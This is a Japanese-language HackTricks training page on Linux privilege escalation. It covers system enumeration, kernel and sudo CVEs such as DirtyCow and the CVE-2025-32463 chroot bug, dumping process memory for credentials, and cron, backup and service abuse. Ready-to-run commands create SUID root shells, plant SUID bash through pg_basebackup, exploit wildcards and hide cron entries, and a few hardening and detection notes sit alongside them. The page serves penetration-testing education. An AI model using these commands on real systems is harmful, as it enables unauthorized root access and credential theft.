# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

より広範な背景情報と従来の列挙ワークフローについては、references に記載されている g0tmi1k、Payatu、SANS、LPE Workshop、Linux-Privilege-Escalation、linux-private-i のリソースを参照してください。<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## システム情報

### OS 情報

まず、実行中の OS に関する情報を集めましょう。

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

`PATH`変数内のいずれかのフォルダに**書き込み権限がある場合**、一部のライブラリやバイナリをhijackできる可能性があります:

```bash
echo $PATH
```

### 環境情報

環境変数に興味深い情報、パスワード、または API キーはありますか？

```bash
(env || set) 2>/dev/null
```

### カーネル exploit

カーネルのバージョンを確認し、権限昇格に利用できる exploit があるか調べます。

[カーネル/LPE/CVE セクション](../../main-system-information/kernel-lpe-cves/README.md)には、ローカル権限昇格の事例と、Binary Exploitation にある Linux カーネルの詳しい解説へのリンクがまとめられています。事例を試す前に、対象のビルドと設定を確認してください。

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

脆弱な kernel の一覧と、すでに**コンパイル済みの exploit**は、こちらで確認できます: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits)。<sup>[[12]](#references)</sup>\
**コンパイル済みの exploit**を入手できる他のサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbw/linux-exploit-binaries)、[https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのサイトから脆弱な kernel のバージョンをすべて抽出するには、次のようにします:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

kernel exploit の検索に役立つツール:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (被害者上で実行。kernel 2.x の exploit のみをチェック)

**必ず kernel のバージョンを Google で検索してください**。kernel のバージョンが kernel exploit に記載されている場合があり、その exploit が有効であると確認できます。

その他の kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux の権限昇格 - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Sudoのバージョン

以下に記載されている脆弱なsudoのバージョンに基づくと:

```bash
searchsploit sudo
```

この grep を使って、sudo のバージョンに脆弱性があるか確認できます。

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

upstream の sudo **1.9.14 から 1.9.17** では、sudo がユーザー制御下のディレクトリから `/etc/nsswitch.conf` を読み込む際に、権限のないローカルユーザーが `--chroot` オプションを使って root に昇格できます。upstream は **1.9.17p1** でこの問題を修正しました。`sudo -V` が表示するのは `PATH` で選択されたバイナリだけなので、該当するパスにある root-setuid の sudo バイナリをすべて確認してください。ディストリビューションのパッケージでは、upstream のバージョン文字列を変更せずに修正がバックポートされている場合があるため、ベンダーのパッケージ状況も確認してください。[sudo メンテナーのアドバイザリ](https://www.openwall.com/lists/oss-security/2025/06/30/3)を参照してください。<sup>[[28]](#references)[[29]](#references)</sup>

この[脆弱性](https://nvd.nist.gov/vuln/detail/CVE-2025-32463)を悪用する[PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)はこちらです。exploit を実行する前に、使用している `sudo` のバージョンに脆弱性があり、`chroot` 機能に対応していることを確認してください。

詳細は、元の[脆弱性アドバイザリ](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)を参照してください。<sup>[[28]](#references)</sup>

### Sudoのホストベースルール回避 (CVE-2025-32462)

upstream の sudo **1.8.8 から 1.9.17** では、ホストベースの sudoers ルールの評価に、**実際のホスト名**ではなく `sudo -h <host>` で指定された**ユーザー提供のホスト名**が使われることがあります。upstream は **1.9.17p1** でこの問題を修正しました。ただし、ユーザーには選択したホスト上で一致する sudoers エントリが必要です。ローカルポリシーに加えて、ベンダーによるバックポートや別の sudo バイナリも確認してください。[sudo メンテナーのアドバイザリ](https://www.openwall.com/lists/oss-security/2025/06/30/2)を参照してください。<sup>[[29]](#references)</sup>

要件:
- 脆弱な sudo バージョン
- ホスト固有の sudoers ルール（ホストが現在のホスト名でも `ALL` でもないこと）

sudoers の設定例:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

許可されたホストを spoofing して exploit:

```bash
sudo -h devbox id
sudo -h devbox -i
```

選択した名前の名前解決がブロックされる場合は、その名前がホスト上でどのように解決されるかを確認してください。ログや設定ファイルに名前が記載されているだけでは、その名前が解決可能とは限りません。また、`/etc/hosts` の変更には通常、特権による書き込みアクセスが必要です。

#### sudo < v1.8.28

この[上流版のRunas UID bypass](https://ubuntu.com/security/CVE-2019-14287)には、rootを除くすべてのユーザーとしてコマンドを実行できる有効なsudoルールが必要です。たとえば、`(ALL, !root) /bin/bash`のようなルールです。呼び出し元ユーザーも、認証要件を含め、そのルールを使用できなければなりません。インストール済みパッケージのセキュリティ勧告を確認してください。ベンダーは、表示上の上流バージョンが1.8.28未満のリリースにも修正をバックポートしています。`!root`ルールがあること、またはバージョンが古いことだけでは、脆弱性の存在は確認できません。受動的な列挙中に、特権コマンドをテストしないでください。

```
sudo -u#-1 /bin/bash
```

### Dmesg の署名検証に失敗

この脆弱性を悪用する方法の**例**については、HTB の **smasher2 box** を確認してください。

```bash
dmesg 2>/dev/null | grep "signature"
```

### さらなるシステム情報収集

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## 想定される防御策を列挙する

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

コンテナ内にいる場合は、まず以下のコンテナセキュリティのセクションを確認し、その後、ランタイム固有の悪用に関するページに進んでください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## ドライブ

**マウントされているものとマウントされていないもの**、その場所と理由を確認してください。マウントされていないものがあれば、マウントして個人情報がないか確認してみてください。

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## 便利なソフトウェア

役立つバイナリを列挙する

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

また、**何らかのコンパイラがインストールされているか**確認してください。kernel exploit を使う必要がある場合に役立ちます。使用するマシン（または類似の環境）上でコンパイルすることが推奨されるためです。

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### 脆弱なソフトウェアのインストール状況

インストールされている**パッケージやサービスのバージョン**を確認してください。たとえば、権限昇格に悪用できる古いバージョンの Nagios が存在するかもしれません…\
疑わしいソフトウェアについては、バージョンを手動で確認することをおすすめします。

```bash
dpkg -l #Debian
rpm -qa #Centos
```

SSH accessがある場合は、**openVAS**を使って、マシン内にインストールされている古いソフトウェアや脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドでは大量の情報が表示され、そのほとんどは役に立ちません。そのため、OpenVASなどのアプリケーションを使って、インストールされているソフトウェアのバージョンに既知のexploitに対する脆弱性がないかチェックすることをおすすめします_

## プロセス

実行中の**プロセス**を確認し、必要以上の**権限**を持つプロセスがないかチェックしてください（たとえば、rootで実行されているtomcatなど）。

```bash
ps aux
ps -ef
top -n 1
```

実行中の[**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md)がないか必ず確認してください。悪用してprivilegesをescalateできる可能性があります。**Linpeas**は、プロセスのコマンドライン内にある`--inspect`パラメータを確認して検出します。\
また、**プロセスのバイナリに対する自分のprivilegesも確認してください**。誰かのバイナリをoverwriteできるかもしれません。

### ユーザーをまたぐ親子プロセスの連鎖

親プロセスとは**異なるユーザー**で実行されている子プロセスがあっても、それだけで悪意があるとは限りませんが、有用な**トリアージの手がかり**になります。一部のユーザー切り替えは想定どおりです（`root`がサービスユーザーを起動する、ログインマネージャーがセッションプロセスを作成するなど）。しかし、不自然な連鎖から、ラッパー、デバッグヘルパー、永続化、または脆弱なランタイムの信頼境界が見つかることがあります。

簡単な確認：

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

驚くような chain を見つけた場合は、親プロセスのコマンドラインと、その動作に影響するすべてのファイル（`config`、`EnvironmentFile`、helper scripts、作業ディレクトリ、書き込み可能な引数）を調べてください。実際の privesc の経路では、子プロセス自体は書き込み可能でなくても、**親プロセスが制御する config** や helper chain が書き込み可能だったケースがいくつかあります。

### 削除された実行ファイルと、削除後も開かれたままのファイル

Runtime artifact は削除後もアクセスできることがよくあります。これは、privilege escalation にも、機密ファイルをすでに開いているプロセスから証拠を復元する場合にも役立ちます。

削除された実行ファイルを確認します。

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

`/proc/<PID>/exe` が `(deleted)` を指している場合、そのプロセスはメモリ上にある古いバイナリイメージを引き続き実行しています。これは調査すべき強いシグナルです。理由は次のとおりです。

- 削除された実行ファイルに、興味深い文字列や認証情報が含まれている可能性がある
- 実行中のプロセスが、役立つファイルディスクリプターを引き続き公開している可能性がある
- 削除された特権バイナリは、最近の改ざんや痕跡隠滅の試みを示している可能性がある

削除済みで、グローバルに開かれているファイルを収集します:

```bash
lsof +L1
```

興味深いディスクリプタを見つけた場合は、直接復元してください。

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

これは、プロセスが削除済みの秘密情報、スクリプト、データベースのエクスポート、または flag file を開いたままの場合に、特に有用です。

### プロセス監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使って、プロセスを監視できます。頻繁に実行される脆弱なプロセスや、特定の要件が満たされたときに実行されるプロセスを特定するのに非常に役立ちます。

#### sudo での Linux ProcMon

[Linux 向け ProcMon](https://github.com/microsoft/ProcMon-for-Linux) は、選択したプロセスとシステムコールをトレースし、SQLite のトレースとして保存できます。`sudo -l` で制限のない root 権限で実行可能な `procmon` コマンドが許可されている場合、他のユーザーのプロセスの入力や出力を監視できるか検討してください。この権限は確認の手がかりにすぎません。トレーサーのサポート、実効ポリシー、適切なプロセスの動作状況も関係します。トレースファイルには秘密情報が含まれることがあるため、許可されたエクスポートを慎重に確認し、無関係なプロセスの収集は避けてください。

### プロセスメモリ

サーバー上のサービスの中には、**メモリ内に認証情報を平文で保存するものがあります**。\
通常、他のユーザーが所有するプロセスのメモリを読み取るには **root 権限**が必要です。そのため、この方法は一般に、すでに root 権限を持っていて、さらに認証情報を見つけたい場合に有用です。\
ただし、**一般ユーザーでも自分が所有するプロセスのメモリは読み取れる**ことを覚えておいてください。

> [!WARNING]
> 現在では、ほとんどのマシンで **デフォルトで ptrace が許可されていない**ため、権限のないユーザーが所有する他のプロセスをダンプできない場合があります。
>
> _**/proc/sys/kernel/yama/ptrace_scope**_ ファイルで ptrace のアクセス可否を制御します。
>
> - **kernel.yama.ptrace_scope = 0**: 同じ uid を持つプロセスであれば、すべてデバッグできます。これは ptrace が動作していた従来の方式です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: CAP_SYS_PTRACE capability が必要なため、管理者のみが ptrace を使用できます。
> - **kernel.yama.ptrace_scope = 3**: ptrace でトレースできるプロセスはありません。一度設定すると、ptrace を再び有効にするには再起動が必要です。

一時的にパスワード vault のロックを解除する同じ UID のプロセスは、独立した認証情報の境界となる場合があります。トレースが許可されている場合、動作中で dumpable なプロセスから、入力システムコールやメモリを通じて vault のパスワードが漏れる可能性があります。暗号化された vault ファイル自体は保護されたままでもです。`ptrace_scope=0` は前提条件の一つにすぎません。同じ認証情報であること、対象プロセスが dumpable であること、他の Linux セキュリティモジュール、プロセスの存続期間も関係します。vault のエントリを Unix の root ログインに利用できるかどうかは、別途、認証情報の再利用を確認する必要があります。通常の調査では、入力を取得したり秘密情報を表示したりせず、ポリシーと候補となるプロセスまたは vault のパスを報告してください。[kernel の Yama ドキュメント](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) と [ptrace のアクセスチェック](https://man7.org/linux/man-pages/man2/ptrace.2.html)を参照してください。

#### GDB

（たとえば）FTP サービスのメモリにアクセスできる場合、その Heap を取得して、中にある認証情報を検索できます。

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### GDBスクリプト

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

指定したプロセス ID に対して、**maps はそのプロセスの仮想アドレス空間内でメモリがどのようにマッピングされているか**を示し、**各マッピング領域の権限**も表示します。**mem** 擬似ファイルは、**プロセスのメモリそのものを公開します**。**maps** ファイルから、**読み取り可能なメモリ領域**とそのオフセットがわかります。この情報を使って、**mem ファイル内の該当位置にシークし、読み取り可能な領域をすべてダンプして**ファイルに保存します。

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` はシステムの**物理**メモリへのアクセスを提供します。仮想メモリではありません。カーネルの仮想アドレス空間には /dev/kmem を使ってアクセスできます。\
通常、`/dev/mem` の読み取り権限があるのは **root** と **kmem** グループのみです。

```
strings /dev/mem -n10 | grep -i PASS
```

### Linux 向け ProcDump

ProcDump は、Windows 用 Sysinternals ツールスイートに含まれる従来の ProcDump ツールを Linux 向けに再構築したものです。[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) から入手できます。

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### ツール

プロセスメモリをダンプするには、次のツールを使用できます。

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root要件は手動で削除でき、自分が所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) の Script A.5 (rootが必要)

### プロセスメモリからの認証情報

#### 手動での例

authenticatorプロセスが実行中であることがわかった場合：

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

プロセスをダンプし（プロセスのメモリをダンプするさまざまな方法については前のセクションを参照）、メモリ内の認証情報を検索できます。

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は、**メモリ内の平文認証情報**や、一部の**既知のファイル**から認証情報を**盗み出します**。正常に動作させるには root 権限が必要です。

| 機能                                              | プロセス名           |
| ------------------------------------------------- | -------------------- |
| GDM パスワード（Kali Desktop、Debian Desktop）    | gdm-password         |
| Gnome Keyring（Ubuntu Desktop、ArchLinux Desktop） | gnome-keyring-daemon |
| LightDM（Ubuntu Desktop）                         | lightdm              |
| VSFTPd（アクティブな FTP 接続）                   | vsftpd               |
| Apache2（アクティブな HTTP Basic Auth セッション） | apache2              |
| OpenSSH（アクティブな SSH セッション - Sudo の使用） | sshd:                |

#### 正規表現の検索/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Scheduled/Cron jobs

### Crontab UI (alseambusher) が root として実行されている場合 – Webベースの scheduler privesc

Web「Crontab UI」パネル（alseambusher/crontab-ui）が root として実行され、loopback のみにバインドされている場合でも、SSH のローカルポートフォワーディング経由でアクセスし、特権ジョブを作成して権限昇格できます。<sup>[[1]](#references)[[4]](#references)</sup>

一般的な手順
- loopback のみで待ち受けているポート（例: 127.0.0.1:8000）と Basic-Auth realm を `ss -ntlp` / `curl -v localhost:8000` で特定する
- 運用関連の成果物から認証情報を探す:
  - `zip -P <password>` を含むバックアップやスクリプト
  - `Environment="BASIC_AUTH_USER=..."`、`Environment="BASIC_AUTH_PWD=..."` を公開している systemd unit
- トンネルを作成してログインする:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 高権限ジョブを作成してすぐに実行（SUID shellを配置）:
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用する:
```bash
/tmp/rootshell -p   # root shell
```

ハードニング
- Crontab UI を root として実行しない。専用ユーザーを割り当て、最小限の権限に制限する
- localhost にバインドし、さらに firewall/VPN でアクセスを制限する。パスワードを使い回さない
- unit files に秘密情報を埋め込まない。secret stores または root のみが読み取り可能な EnvironmentFile を使う
- オンデマンドのジョブ実行に対する audit/logging を有効にする

スケジュールされたジョブに脆弱性がないか確認する。root で実行されるスクリプトを悪用できるかもしれない（wildcard vuln？root が使用するファイルを変更できる？symlink を使う？root が使用するディレクトリに特定のファイルを作成する？）。

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

`run-parts` が使用されている場合は、実際に実行される名前を確認します：

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

これにより誤検知を回避できます。書き込み可能な定期実行ディレクトリが役立つのは、payload のファイル名がローカルの `run-parts` のルールに一致する場合だけです。

### Cron の PATH

たとえば、_/etc/crontab_ 内で PATH を確認できます: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

（ユーザー「user」が /home/user に対する書き込み権限を持っている点に注目してください）

この crontab 内で root ユーザーが PATH を設定せずにコマンドやスクリプトを実行しようとした場合、たとえば _\* \* \* \* root overwrite.sh_\
次の方法で root shell を取得できます:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### ワイルドカードを使うスクリプトによる Cron（Wildcard Injection）

root がスクリプトを実行し、そのコマンド内に「**\***」が含まれている場合、これを悪用して予期しない動作（privesc など）を引き起こせる可能性があります。例：

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**wildcard の前に次のようなパスが付いている場合** _**/some/path/\***_ **、脆弱ではありません（_**./\***_ **でさえも同様です）。**

wildcard を悪用するその他のテクニックについては、次のページを参照してください。


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### cron log parser における Bash arithmetic expansion injection

Bash の算術演算では、信頼できないテキストが式として解釈されることがあります。影響を受ける Bash のコンテキストでは、その式内の配列の添字によって command substitution が評価される場合があります。特権 cron/parser が攻撃者の制御するログテキストをそのような算術比較に渡すと、その置換は parser の実行ユーザー権限で実行される可能性があります。<sup>[[22]](#references)</sup> これは正確な Bash の式とバージョンによって異なります。展開された変数内に単独で `$(...)0` という文字列があるだけでは、再評価が確実に起こることの証明にはなりません。

入力元は、ファイルのメタデータや、ユーザーが書き込み可能な場所から読み取られる別のフィールドの場合もあります。たとえば、特権で動作するクリーンアップスクリプトが画像の `Producer` タグを読み取り、`[[ "$producer" -eq "expected" ]]` と比較すると、変数が引用符で囲まれていても算術比較が行われます。スケジュールされた実行ユーザー、タグの供給元となり得るファイル、比較前に行われる変換、正確な Bash の動作を確認してください。テキストラベルには文字列比較を使い、数値には算術演算の前に入力が10進数字のみであることを検証してください。[Bash の算術演算規則](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html)を参照してください。

- 典型的な脆弱パターン：
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- array-subscript mechanism の安全なローカル動作確認（特権プロセスやファイルの変更なし）:
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

実際にスケジュール実行されるスクリプトと、そのスクリプトが開くリテラルな入力パスを追跡してください。ログファイル自体に書き込めなくても、スティッキーでない親ディレクトリに書き込み・検索権限があれば、そのディレクトリエントリを置き換えられる場合があります。`namei -l` を使うと、これらの権限を区別できます。別の書き込み可能なログパス、読み取れないスケジューラ、またはそのフィールドを Bash arithmetic として評価しないパーサーが見つかっても、この経路が成立することの証明にはなりません。

### Cron script の上書きと symlink

root で実行される cron script を**変更できる**場合、簡単に shell を取得できます。

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

root が実行するスクリプトが、あなたに完全なアクセス権があるディレクトリを使用している場合、そのフォルダを削除し、あなたが制御するスクリプトを置いた別の場所へのシンボリックリンクを作成すると有効かもしれません。

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### シンボリックリンクの検証と安全なファイル処理

パスを指定してファイルを読み書きする特権スクリプトやバイナリを確認する際は、リンクがどのように扱われるかを検証してください。

- `stat()` はシンボリックリンクをたどり、リンク先のメタデータを返します。
- `lstat()` はリンク自体のメタデータを返します。
- `readlink -f` と `namei -l` は、最終的なリンク先の解決や、各パス要素の権限の確認に役立ちます。

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

防御側／開発者が symlink trick を防ぐために使える、より安全なパターンは次のとおりです。

- `O_EXCL` と `O_CREAT`：パスがすでに存在する場合は失敗する（攻撃者が事前に作成したリンク／ファイルを防ぐ）。
- `openat()`：信頼できるディレクトリのファイル記述子を基準に操作する。
- `mkstemp()`：安全な権限で一時ファイルをアトミックに作成する。

### 書き込み可能な payloads を持つカスタム署名済み cron バイナリ

root の cron job が実行する正確なバイナリに書き込める一般ユーザーは、権限境界を越えられる可能性がありますが、カスタム署名チェックによって署名のない差し替えを拒否できます。記録されている事例では、root 所有の ELF のモードは `0760` で、グループメンバーが書き込み可能である一方、root 所有者は実行できました。目視できるプロセストレースには、job がバイナリを実行する前に `objcopy` が `.text_sig` を抽出している様子が示されていました。検証スクリプト全体は読み取りできませんでした。<sup>[[2]](#references)</sup>

成功した差し替え版は、leaked private signing material を使い、ELF signer で署名されていました。その[フォーマットのドキュメント](https://github.com/NUAA-WatchDog/linux-elf-binary-signer)には、実行ファイルの `.text` から生成される署名セクションについて記載されています。証明書や一致する文字列を `.text_sig` に追加しただけで、未確認の検証処理を通過できるとは示されていません。書き込み可能な署名済みバイナリが悪用可能だと結論づける前に、実際にスケジュールされているパス、有効な書き込み権限、root による実行、および検証ポリシーを確認してください。`.text_sig` セクションがあること自体は、あくまで調査の手がかりです。

### 頻繁に実行される cron job

プロセスを監視し、1、2、5 分ごとに実行されるプロセスを探せます。そこにつけ込んで権限昇格できるかもしれません。

たとえば、**1 分間、0.1 秒ごとに監視**し、**実行回数の少ないコマンドから並べ替え**て、実行回数が最も多いコマンドを削除するには、次のようにします。

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (これを使うと、起動するすべてのプロセスを監視して一覧表示できます)。

### 攻撃者が設定した mode bits を保持する root バックアップ（pg_basebackup）

root 権限で実行される cron が、書き込み可能なデータベースディレクトリに対して `pg_basebackup`（または再帰的なコピー処理）を実行している場合、**SUID/SGID binary** を仕込むことで、同じ mode bits を保持したまま、バックアップ先に **root:root** 所有で再コピーさせることができます。<sup>[[26]](#references)</sup>

典型的な調査の流れ（低権限の DB ユーザーとして）:
- `pspy` を使って、`/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` のようなコマンドを root cron が毎分実行していることを確認します。
- ソースのクラスタ（例: `/var/lib/postgresql/14/main`）に書き込み可能であることと、ジョブの実行後に宛先（`/opt/backups/current`）の所有者が root になることを確認します。

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

これは、`pg_basebackup` がクラスターをコピーする際にファイルのモードビットを保持するためです。root で実行すると、コピー先のファイルは **root の所有権 + 攻撃者が選んだ SUID/SGID** を引き継ぎます。権限を保持したまま実行可能な場所に書き込む、同様の特権バックアップ／コピー処理はすべて脆弱です。

### 見えない cron ジョブ

コメントの後にキャリッジリターンを入れる（改行文字は入れない）ことで、cronjob を作成できます。この cron ジョブは正常に動作します。例（キャリッジリターン文字に注意してください）：

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

この種のステルスエントリを検出するには、制御文字を表示できるツールを使って cron ファイルを調べます:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込めるか確認してください。書き込める場合は、サービスの**起動時**、**再起動時**、または**停止時**に**backdoorを実行する**よう変更できます（マシンが再起動されるまで待つ必要があるかもしれません）。\
